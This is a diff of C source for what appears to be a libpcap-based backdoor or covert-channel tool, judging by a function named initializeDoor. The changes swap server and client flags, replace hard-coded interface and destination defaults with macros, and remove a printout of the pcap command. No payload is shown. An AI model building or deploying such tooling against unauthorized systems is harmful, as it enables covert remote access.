@@ -42,10 +42,10 @@ int main(int argc, char** argv)
 
     if (argc >= 2) 
     {
-        server = 1;
+        server = 0; // this is client
         client((void*)Addr_Ptr, (void*)pcap_ptr, &ThreadID2);
     } else {
-        server = 0;
+        server = 1;
         startServer((void*)Addr_Ptr, (void*)pcap_ptr, &ThreadID2);
     }
 
@@ -158,7 +158,7 @@ void initializePcap(PcapInfo **pcap_ptr, AddrInfo *Addr_Ptr)
 ------------------------------------------------------------------------------*/
 void setPcap(PcapInfo* pcap_ptr, AddrInfo *Addr_Ptr)
 {
-    char *nic_dev = "p2p1"; // CHANGE; 
+    char *nic_dev = INTERFACE; // CHANGE; 
     char errbuf[PCAP_ERRBUF_SIZE];
     bpf_u_int32 maskp;          // subnet mask    
 
@@ -173,7 +173,6 @@ void setPcap(PcapInfo* pcap_ptr, AddrInfo *Addr_Ptr)
 
     //snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD, Addr_Ptr->DstHost, Addr_Ptr->dport);
     snprintf (pcap_ptr->cmd, sizeof(pcap_ptr->cmd), CMD);
-    printf("%s\n", pcap_ptr->cmd);
 }
 
 /*------------------------------------------------------------------------------
@@ -202,7 +201,7 @@ void initializeDoor(AddrInfo *Addr_Ptr)
 
     // set defaults
     Addr_Ptr->SrcHost = GetIPAddress();    // Default Source IP
-    Addr_Ptr->DstHost = NULL;           // Must be specified by user!
+    Addr_Ptr->DstHost = SRCIP;           // Must be specified by user!
     Addr_Ptr->dport = DEFAULT_DST_PORT;     // Default Destination Port
     Addr_Ptr->sport = rand()% 40000 + 2000; // Default (Random) Source Port between 2000 and 60000
 }
